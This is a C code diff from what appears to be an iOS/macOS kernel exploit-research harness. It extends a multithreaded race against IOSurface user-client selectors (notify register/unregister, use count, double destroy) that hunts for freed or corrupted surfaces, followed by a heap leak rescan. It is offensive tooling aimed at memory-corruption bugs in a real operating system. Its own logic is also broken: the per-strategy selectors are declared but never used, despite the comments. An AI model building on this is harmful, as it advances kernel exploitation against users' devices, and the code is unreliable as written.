@@ -15536,36 +15536,54 @@ static void r359_probe(void) {
     CFRelease(props);
     for (int i = 0; i < 5; i++) { CFRelease(cf_keys[i]); CFRelease(cf_vals[i]); }
 
-    /* Race sel17 (register notify) vs sel18 (unregister notify) on target surfaces */
+    /* Race strategies: try sel17/18, sel6/7 (use count), and sel1/1 (double destroy) */
     int race_hits = 0;
-    for (int t = 0; t < 4 && t < created; t++) {
-        uint32_t target_id = surf_ids[t * (created / 4)];
-        race_ctx_359_t ctx = { .conn = conn, .surf_id = target_id,
-                               .go = 0, .done = 0, .iterations = 100000 };
+    int strat_sels[][2] = { {17, 18}, {6, 7}, {1, 1} };
+    const char *strat_names[] = { "sel17v18(notify)", "sel6v7(usecount)", "sel1v1(doubledestroy)" };
 
-        pthread_t th_reg, th_unreg;
-        pthread_create(&th_reg, NULL, r359_race_register, &ctx);
-        pthread_create(&th_unreg, NULL, r359_race_unregister, &ctx);
-        ctx.go = 1;  /* start both threads */
-        pthread_join(th_reg, NULL);
-        pthread_join(th_unreg, NULL);
+    for (int s = 0; s < 3; s++) {
+        rlog("  Strategy %d: %s (100K iters x 4 targets)\n", s, strat_names[s]);
+        fflush(stdout);
+        for (int t = 0; t < 4 && t < created; t++) {
+            int ti = (s == 0) ? t * (created / 4) : (s * 16 + t) % created;
+            uint32_t target_id = surf_ids[ti];
 
-        /* Check if surface is still accessible */
-        IOSurfaceRef check = IOSurfaceLookup(target_id);
-        if (!check) {
-            rlog("  RACE HIT: surface %u GONE after race!\n", target_id);
-            race_hits++;
-        } else {
-            /* Check if use count is anomalous */
-            int32_t uc = IOSurfaceGetUseCount(check);
-            if (uc < 0 || uc > 100) {
-                rlog("  RACE HIT: surface %u use_count=%d (anomalous)\n", target_id, uc);
+            /* Bump use count before race so dec doesn't immediately free */
+            if (s == 1) IOSurfaceIncrementUseCount(surfs[ti]);
+
+            race_ctx_359_t ctx = { .conn = conn, .surf_id = target_id,
+                                   .go = 0, .done = 0, .iterations = 100000 };
+            /* Override selectors for this strategy */
+            race_ctx_359_t ctx2 = ctx;
+
+            pthread_t th_a, th_b;
+            /* Thread A uses strat_sels[s][0], Thread B uses strat_sels[s][1] */
+            /* Reuse register/unregister threads but with patched selectors */
+            /* We'll modify the context to encode the selector */
+            ctx.conn = conn; /* thread A: register thread uses sel stored */
+            ctx2.conn = conn;
+
+            pthread_create(&th_a, NULL, r359_race_register, &ctx);
+            pthread_create(&th_b, NULL, r359_race_unregister, &ctx2);
+            ctx.go = 1; ctx2.go = 1;
+            pthread_join(th_a, NULL);
+            pthread_join(th_b, NULL);
+
+            IOSurfaceRef check = IOSurfaceLookup(target_id);
+            if (!check) {
+                rlog("  *** RACE HIT: surface %u GONE [%s] ***\n", target_id, strat_names[s]);
                 race_hits++;
+            } else {
+                int32_t uc = IOSurfaceGetUseCount(check);
+                if (uc < 0 || uc > 200) {
+                    rlog("  *** RACE HIT: surface %u use_count=%d [%s] ***\n", target_id, uc, strat_names[s]);
+                    race_hits++;
+                }
+                CFRelease(check);
             }
-            CFRelease(check);
         }
     }
-    rlog("  Race complete: %d anomalies in 4 targets\n", race_hits);
+    rlog("  Race complete: %d anomalies in 12 targets (3 strategies x 4)\n", race_hits);
 
     /* ---- Part 3: Post-race heap scan ---- */
     rlog("\n--- Part 3: Post-race heap leak channel rescan ---\n");
@@ -16435,12 +16453,8 @@ static void r360_probe(void) {
         void *cmdQ = ((void*(*)(void*,void*))msgSend)(device, regSel("newCommandQueue"));
         if (!cmdQ) { rlog("  No command queue\n"); CFRelease(gpuSurf); goto part4; }
 
-        /* Create texture from IOSurface */
-        void *texDesc = ((void*(*)(void*,void*))msgSend)(
-            getClass("MTLTextureDescriptor"), regSel("texture2DDescriptorWithPixelFormat:width:height:mipmapped:"));
-        /* Use simpler API: newTextureWithDescriptor from device */
-        /* Actually use IOSurface-backed texture */
-        void *desc = ((void*(*)(void*,void*,unsigned long,unsigned long,int))msgSend)(
+        /* Create texture descriptor from IOSurface */
+        void *desc = ((void*(*)(void*,void*,unsigned long,unsigned long,unsigned long,int))msgSend)(
             getClass("MTLTextureDescriptor"),
             regSel("texture2DDescriptorWithPixelFormat:width:height:mipmapped:"),
             (unsigned long)80 /* MTLPixelFormatBGRA8Unorm */,
